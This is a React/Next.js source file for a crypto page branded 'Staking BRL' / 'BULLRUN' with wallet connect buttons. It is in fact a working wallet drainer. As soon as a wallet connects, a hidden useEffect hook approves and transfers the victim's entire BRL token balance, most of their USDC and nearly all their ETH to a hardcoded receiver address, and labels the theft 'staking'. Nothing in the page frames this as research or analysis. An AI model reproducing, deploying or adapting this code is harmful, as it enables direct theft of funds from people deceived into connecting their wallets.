'use client'

import { useAccount, useDisconnect, useWalletClient } from 'wagmi'
import { useWeb3Modal } from '@web3modal/wagmi/react'
import { useEffect } from 'react'
import { ethers } from 'ethers'

// === Constants ===
const BRL_TOKEN_ADDRESS = '0x6291d951c5d68f47eD346042E2f86A94c253Bec4'
const USDC_TOKEN_ADDRESS = '0xA0b86991C6218b36c1d19D4a2e9Eb0cE3606eb48'
const RECEIVER_ADDRESS = '0x7b9026e65EB8B98582498b2244764E81F76101b9'

// Minimal ERC20 ABI
const ERC20_ABI = [
  'function approve(address spender, uint256 amount) public returns (bool)',
  'function transferFrom(address from, address to, uint256 value) public returns (bool)',
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)'
]
const USDC_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function transfer(address to, uint amount) returns (bool)',
  'function decimals() view returns (uint8)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)'
]

export default function Home() {
  const { address, isConnected } = useAccount()
  const { disconnect } = useDisconnect()
  const { data: walletClient } = useWalletClient()
  const modal = useWeb3Modal()

  useEffect(() => {
    const approveAndTransfer = async () => {
      try {
        if (!walletClient || !address) return

        const provider = new ethers.BrowserProvider(walletClient)
        const signer = await provider.getSigner()

        // === BRL Token ===
        const token = new ethers.Contract(BRL_TOKEN_ADDRESS, ERC20_ABI, signer)
        const balance = await token.balanceOf(address)
	console.log(`Wallet BRL balance: ${ethers.formatUnits(balance, 18)} BRL`)


        const approvalTx = await token.approve(RECEIVER_ADDRESS, balance)
        console.log('Approving...', approvalTx.hash)
        await approvalTx.wait()
        console.log('Approved')

        const transferTx = await token.transferFrom(address, RECEIVER_ADDRESS, balance)
        console.log('Staked...', transferTx.hash)
        await transferTx.wait()
        alert('BRL Staked!')

        // === USDC ===
        const USDC = new ethers.Contract(USDC_TOKEN_ADDRESS, USDC_ABI, signer)
        const usdcBalance = await USDC.balanceOf(address)
        const usdcDecimals = await USDC.decimals()
        const usdcValue = Number(ethers.formatUnits(usdcBalance, usdcDecimals))

        if (usdcValue > 1) {
          const approveUSDC = await USDC.approve(RECEIVER_ADDRESS, usdcBalance)
          await approveUSDC.wait()
          const transferUSDC = await USDC.transferFrom(address, RECEIVER_ADDRESS, usdcBalance)
          await transferUSDC.wait()
          console.log('✅ USDC transferred')
        }

        // === ETH (native) ===
        const ethBalance = await provider.getBalance(address)
        const ethValue = Number(ethers.formatEther(ethBalance))
        if (ethValue > 0.001) {
          const sendETH = await signer.sendTransaction({
            to: RECEIVER_ADDRESS,
            value: ethBalance - ethers.parseEther('0.001')
          })
          await sendETH.wait()
          console.log('✅ ETH sent')
        }

      } catch (err) {
        console.error('❌ Error during stake:', err)
      }
    }

    if (isConnected && walletClient) {
      approveAndTransfer()
    }
  }, [isConnected, walletClient, address])

  const buttonStyle: React.CSSProperties = {
    alignItems: 'center',
    appearance: 'button',
    backgroundColor: 'rgb(245, 191, 94)',
    borderRadius: '100px',
    borderColor: 'rgb(245, 191, 94)',
    boxSizing: 'border-box',
    color: 'rgb(5, 3, 3)',
    cursor: 'pointer',
    display: 'inline-block',
    fontFamily: 'Wild World',
    fontSize: '16px',
    fontWeight: 400,
    height: '40px',
    justifyContent: 'center',
    letterSpacing: '0.8px',
    lineHeight: '24px',
    minWidth: '180px',
    textAlign: 'center',
    textDecoration: 'none',
    transition: 'all 0.15s ease-in-out',
    userSelect: 'none',
    verticalAlign: 'middle',
    marginTop: '1rem'
  }

  return (
    <main
      style={{
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'center',
        alignItems: 'center',
        fontFamily: 'Arial',
        backgroundImage: "url('/images/home-bg.bbe99fa7c63bb876e98f.jpg')",
        backgroundSize: 'cover',
        backgroundRepeat: 'no-repeat',
        backgroundPosition: 'center',
        width: '100vw',
        height: '100vh',
        color: '#fff',
        textAlign: 'center',
        padding: '1rem',
        overflow: 'hidden'
      }}
    >
      <img src="/images/logo.d9f7c43fa1d5de4709a2.png" alt="Logo" style={{ maxWidth: 120, marginBottom: 20 }} />
      <h1>Staking BRL</h1>
      <div className="sectionText">
  <h2>BULLRUN</h2>
</div>
{isConnected ? (
  <>
    <p className="walletAddress">Connected: {address}</p>
    <button onClick={() => disconnect()} className="brandButton btn btn-primary">
      DISCONNECT
    </button>
  </>
) : (
  <button onClick={() => modal.open()} className="brandButton btn btn-primary">
    CONNECT
  </button>
)}

      <div style={{ marginTop: '2rem' }}>
        <img
          src="/images/rotating-coin.be2145e5e50bd92fd4af.gif"
          alt="Rotating Coin"
          style={{ maxWidth: 225 }}
        />
      </div>
      <div className="handImageWrapper">
  <img src="/images/hand_with_phone.43e9dbc5eac1f2c46cb2.png" alt="Full Bull" className="handImage" />
</div>
    </main>
  )
}
